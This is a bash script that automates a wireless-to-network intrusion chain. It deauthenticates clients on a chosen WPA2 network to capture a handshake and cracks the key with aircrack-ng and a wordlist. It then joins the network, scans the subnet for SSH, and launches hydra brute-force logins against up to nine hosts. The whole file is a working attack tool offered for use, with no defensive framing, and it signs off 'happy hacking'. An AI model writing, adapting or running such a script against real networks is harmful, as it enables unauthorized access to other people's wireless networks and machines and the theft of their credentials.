#! /bin/bash
# check nearby wireless networks
# attempt to break WPA2 security
# uses airmon, airodump, airolib, aircrack
# thc-hydra, network manager

echo starting the script...; sleep 1s

# somewhere to work
mkdir airTmp

# kill conflicts
airmon-ng check kill; echo "some may restart..."

# put card in mon mode
airmon-ng
read -p "stop any conflicting interface: " interface1
airmon-ng stop $interface1 >> airTmp/errors.log
read -p "start monitoring an interface: " interface2
airmon-ng start $interface2 >> airTmp/errors.log

# map attack points
xterm -hold -geometry -10+10 -e airodump-ng -w airTmp/initialDump mon0 &
PID1=$!
read -p "which bssid do you want to target: " bssid
read -p "on which channel: " channel
read -p "network name: " essid
touch airTmp/essid.lst; echo $essid > airTmp/essid.lst

# target one attack point
xterm -hold -geometry -10+250 -e airodump-ng -c $channel --bssid $bssid -w airTmp/targetDump $interface mon0 &
PID2=$!
while :
do
read -p </dev/tty "use which station: " station
aireplay-ng -0 2 -a $bssid -c $station --ignore-negative-one mon0
read -p </dev/tty "handshake successful? [y:n] " handshake
if [ $handshake = "n" ]; then
	echo "try another client or try again"
elif [ $handshake = "y" ]; then
	break
else
	echo "y or n"
fi
done

# get pass list
read -p "full wordlist pathname: " wordlist

# add target essid to sqlite database
echo "we will use a database for speed"
airolib-ng airTmp/wpaDatabase --import essid airTmp/essid.lst
airolib-ng airTmp/wpaDatabase --import passwd $wordlist
echo "maintenance..."
airolib-ng airTmp/wpaDatabase --stats
airolib-ng airTmp/wpaDatabase --clean all
airolib-ng airTmp/wpaDatabase --batch
airolib-ng airTmp/wpaDatabase --verify all
echo database updated
echo preparing aircrack...
sleep 10s

# crack, database assisted
xterm -hold -geometry -10+10 -e aircrack-ng -r airTmp/wpaDatabase airTmp/targetDump-01.cap &
PID3=$!
kill $PID1 $PID2 >> airTmp/errors.log

# extract pass
read -p "input the pass key: " key
kill $PID3 >> airTmp/errors.log

# connect
echo starting network manager
service network-manager start >& airTmp/silent.log
echo connecting...
nmcli dev wifi con $bssid password $key

#map
echo mapping...
nmap -sT 10.0.0.1/24 -p 22 --open > airTmp/netMap
cat airTmp/netMap | grep "Nmap scan" | tr -d 'Nmap scan report for' > airTmp/sshTargets

#attack
echo attacking...
i="10"
for line in $(cat airTmp/sshTargets | sed -n '1,3p')
do
        xterm -hold -geometry -$i+10 -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done
sleep 1s
cat airTmp/sshTargets
i="10"
j="250"
for line in $(cat airTmp/sshTargets | sed -n '4,6p')
do
        xterm -hold -geometry -$i+$j -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done
sleep 1s

i="10"
j="500"
for line in $(cat airTmp/sshTargets | sed -n '7,9p')
do
        xterm -hold -geometry -$i+$j -e hydra -L logins.lst -P pass.lst -t 8 -v $line ssh &
        i=$[$i+400]
done

# cleanup
echo "commencing cleanup..."
read -p "keep the target data from this session? [y:n]" save
if [ $save = "y" ]; then
	read -p "name the new directory: " dir
	mv airTmp $dir
elif [ $save = "n" ]; then
	echo "deleting airTmp..."
	rm -f airTmp/*
	rmdir airTmp
fi
read -p "kill all xterm instances: [y:n] " killx
if [ $killx = "y" ]; then
	killall xterm
else
	echo "happy hacking"
fi
